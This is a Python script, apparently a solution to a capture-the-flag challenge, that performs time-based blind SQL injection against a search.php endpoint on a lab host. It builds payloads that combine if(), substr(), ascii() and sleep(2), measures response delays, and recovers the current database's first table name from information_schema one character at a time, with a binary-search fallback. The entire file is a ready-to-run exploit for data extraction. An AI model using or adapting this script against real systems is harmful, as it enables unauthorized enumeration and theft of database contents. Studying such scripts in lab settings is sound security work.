#!/usr/bin/env python3
import requests
import time
import string

url = "http://79d988fc-c632-49d2-be7a-320d604a898c.node5.buuoj.cn:81/search.php"

def check_time(payload, threshold=2):
    """Returns True if response time > threshold"""
    try:
        start = time.time()
        r = requests.get(url, params={"id": payload}, timeout=15)
        elapsed = time.time() - start
        return elapsed > threshold
    except:
        return False

def get_length_time(expr, max_len=100):
    """Get length using time-based blind injection"""
    for i in range(1, max_len + 1):
        payload = f"1^(if(length({expr})={i},sleep(2),0))"
        if check_time(payload):
            return i
    return None

def get_string_time(expr, length):
    """Get string using time-based blind injection"""
    result = ""
    chars = string.ascii_lowercase + string.digits + "_-{}" + string.ascii_uppercase
    
    for i in range(1, length + 1):
        found = False
        for c in chars:
            payload = f"1^(if(substr({expr},{i},1)='{c}',sleep(2),0))"
            if check_time(payload):
                result += c
                print(f"[+] Position {i}: {c} -> {result}")
                found = True
                break
        if not found:
            # Binary search
            low, high = 32, 126
            while low < high:
                mid = (low + high) // 2
                payload = f"1^(if(ascii(substr({expr},{i},1))>{mid},sleep(2),0))"
                if check_time(payload):
                    low = mid + 1
                else:
                    high = mid
            result += chr(low)
            print(f"[+] Position {i}: {chr(low)} -> {result}")
    return result

# Test if we can use subqueries
print("[*] Testing subquery with time blind...")
test_payload = "1^(if((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)>0,sleep(2),0))"
print(f"[*] Payload: {test_payload}")
print(f"[*] Result: {check_time(test_payload)}")

# Get first table
print("\n[*] Getting first table length...")
table_expr = "(select table_name from information_schema.tables where table_schema=database() limit 0,1)"
table_len = get_length_time(table_expr, 50)
if table_len:
    print(f"[+] First table length: {table_len}")
    print("[*] Getting first table name...")
    table_name = get_string_time(table_expr, table_len)
    print(f"[+] First table: {table_name}")
